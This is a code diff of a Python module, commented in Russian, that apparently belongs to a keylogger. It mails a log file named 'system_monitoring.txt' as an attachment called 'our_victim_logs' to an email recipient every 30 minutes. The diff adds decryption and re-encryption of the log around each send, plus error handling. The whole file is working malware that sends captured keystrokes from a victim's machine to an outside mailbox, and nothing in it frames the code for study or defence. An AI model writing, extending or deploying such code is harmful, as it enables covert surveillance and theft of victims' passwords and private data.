@@ -1,11 +1,14 @@
 """ФАЙЛ ПО СОЗДАНИЮ ОТПРАВКИ ЛОГОВ НА ПОЧТУ"""
-import os.path
+import os
 import smtplib
 import time
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.application import MIMEApplication
 import schedule
+from decryption import main_dcrp
+from encryption import main_ecrp
+
 
 # функция отправления электронного письма
 def send_email(file_path):
@@ -21,6 +24,8 @@ def send_email(file_path):
     server.starttls()
     server.login(sender, password)
 
+    main_dcrp()
+
     msg = MIMEMultipart()
     msg['Subject'] = "keyloger"
     msg['From'] = sender
@@ -29,20 +34,27 @@ def send_email(file_path):
     # Присоединяем текстовое сообщение
     msg.attach(MIMEText("См. вложение для логов.", 'plain'))
 
-    # Открываем файл и прикрепляем его как вложение
-    with open(file_path, "rb") as file:
-        part = MIMEApplication(file.read())
-        part.add_header('Content-Disposition', 'attachment', filename="our_victim_logs")
-        msg.attach(part)
+    # обработчик ошибок
+    try:
+
+        # Открываем файл и прикрепляем его как вложение
+        with open(file_path, "rb") as file:
+            part = MIMEApplication(file.read())
+            part.add_header('Content-Disposition', 'attachment', filename="our_victim_logs")
+            msg.attach(part)
+            print('Файл успешно отправлен!')
+
+    except FileNotFoundError:     # если файл не найден
+        print(f'Файл {file_path} не найден')
 
     server.sendmail(sender, recipient, msg.as_string())
-    print('Файл успешно отправлен!')
+    main_ecrp()
     server.quit()
 
 
 # Функция выполнения расписания
 def run_schedule(file_path):
-    schedule.every(30).seconds.do(send_email, file_path)
+    schedule.every(30).minutes.do(send_email, file_path)
 
     while True:
         schedule.run_pending()
@@ -51,7 +63,9 @@ def run_schedule(file_path):
 
 def main():
     # путь к файлу с кейлогами
-    file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'system_monitoring.txt')
+    file_name = 'system_monitoring.txt'
+    current_directory = os.path.dirname(os.path.abspath(__file__))
+    file_path = os.path.join(current_directory, file_name)
+
     # Запуск выполнения расписания
     run_schedule(file_path)
-
